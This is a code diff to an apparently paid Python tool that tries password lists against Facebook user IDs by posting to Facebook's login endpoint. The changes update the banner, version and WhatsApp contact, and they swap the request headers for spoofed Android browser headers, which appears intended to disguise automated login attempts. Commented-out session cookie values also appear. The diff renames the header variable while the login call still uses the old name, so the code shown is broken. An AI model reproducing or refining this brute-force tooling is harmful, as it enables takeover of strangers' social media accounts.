@@ -139,16 +139,18 @@ device = {
         'fbdm':fbdm}
 
 logo=("""\033[1;91m
-\033[1;97m::::    ::::  :::    ::: :::::::::   ::::::::  :::    :::     :::     :::::::::  
- \033[1;97m ──────────╔═╗╔╗──────╔╗
-\033[1;97m╔══╗╔╦╗╔╦╗║═╣║╚╗╔═╗─╔╝║
-\033[1;97m║║║║║║║║╔╝╠═║║║║║╬╚╗║╬║
-\033[1;97m╚╩╩╝╚═╝╚╝─╚═╝╚╩╝╚══╝╚═╝
+\033[1;97m::::    ::::  :::    ::: :::::::::   ::::::::  :::    :::     :::     :::::::::                                                  
+\033[1;37m#    # #    # #####   ####  #    #   ##   #####  
+\033[1;37m##  ## #    # #    # #      #    #  #  #  #    # 
+\033[1;37m# ## # #    # #    #  ####  ###### #    # #    # 
+\033[1;37m#    # #    # #####       # #    # ###### #    # 
+\033[1;37m#    # #    # #   #  #    # #    # #    # #    # 
+\033[1;37m#    #  ####  #    #  ####  #    # #    # #####  
 \033[1;37m--------------------------------------------------
 [~] Author   : murshad 
 [~] Facebook : Muhammad mansoor
 [~] Tool     : Paid
-[~] Version  : 30.1
+[~] Version  : 30.2
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -276,7 +278,7 @@ def menu():
 				#dz._login()
 				exit()
 			elif xd in ['4','04']:
-				os.system('xdg-open https://wa.me/+923245306435?text=')
+				os.system('xdg-open https://wa.me/+923104013249?text=')
 				menu()
 			elif xd in ['0','00']:
 				exit(' Thanks for use 🥰 ')
@@ -1530,23 +1532,23 @@ def MK6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
+			headers = {'authority': 'm.facebook.com',
             'viewport-width': '980',
-			'method': 'path',
-			'scheme': 'https',
-             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-             'cache-control': 'max-age=0',
-             # 'cookie': 'datr=qUhTZL-aLvKHLu0MwecU6_gX; sb=qUhTZJbGOhsdyGzz4WCRDOMt',
-             'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
-             'sec-ch-ua-mobile': '?0',
-             'sec-ch-ua-platform': '"Windows"',
-             'sec-fetch-dest': 'document',
-             'sec-fetch-mode': 'navigate',
-             'sec-fetch-site': 'none',
-             'sec-fetch-user': '?1',
-             'upgrade-insecure-requests': '1',
-             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5652.221 Safari/537.36',
+            'method': 'path',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+           # 'cookie': 'datr=qUhTZL-aLvKHLu0MwecU6_gX; sb=qUhTZJbGOhsdyGzz4WCRDOMt; m_pixel_ratio=2; wd=360x668; fr=076b93pgeN8VCDS9q..BkU2H-.qZ.AAA.0.0.BkU2Mw.AWXpKO9zPSY',
+           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5649.219 Mobile Safari/537.36',
 }
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
